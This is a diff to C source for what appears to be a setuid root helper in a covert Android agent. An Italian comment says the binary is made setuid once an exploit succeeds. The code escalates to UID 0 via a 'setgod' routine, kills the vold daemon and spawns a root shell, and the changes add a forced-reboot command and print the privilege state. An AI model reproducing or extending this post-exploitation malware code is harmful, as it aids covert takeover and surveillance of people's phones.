@@ -21,12 +21,14 @@
 #include <jni.h>
 #include <android/log.h>
 #include <dirent.h>
+#include <linux/reboot.h>
 
 #define LOG(x)  printf(x)
 
 static int copy(const char *from, const char *to);
 unsigned int getProcessId(const char *p_processname);
 int setgod();
+void sync_reboot();
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 
@@ -43,6 +45,8 @@ int main(int argc, char** argv) {
 			chmod("/data/data/com.android.service/files/frame", 0666);
 		} else if (strcmp(argv[1], "vol") == 0) {
 			unsigned int pid;
+		
+			LOG("Killing VOLD\n");
 
 			for (i = 0; i < 2; i++) {
 				pid = getProcessId("vold");
@@ -52,6 +56,10 @@ int main(int argc, char** argv) {
 					sleep(2);
 				}	
 			}
+		} else if (strcmp(argv[1], "reb") == 0) {
+			LOG("Rebooting...\n");
+
+			sync_reboot();
 		}
 	} else {
 		const char * shell = "/system/bin/sh";
@@ -164,8 +172,20 @@ unsigned int getProcessId(const char *p_processname) {
     return result;
 }
 
+void sync_reboot() {
+	char buf[256];
+
+	setgod();
+	sync();
+
+	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
+		sprintf(buf, "Error rebooting: %d\n", errno);
+		LOG(buf);	
+	}
+}
+
 int setgod() {
-    char buf[512];
+    char buf[256];
 
     //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
     //LOG(buf);
@@ -175,8 +195,8 @@ int setgod() {
     setgid(0);
     seteuid(0);
 
-    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
-    //LOG(buf);
+    sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
+    LOG(buf);
 
     return (seteuid(0) == 0) ? 1 : 0;
 }
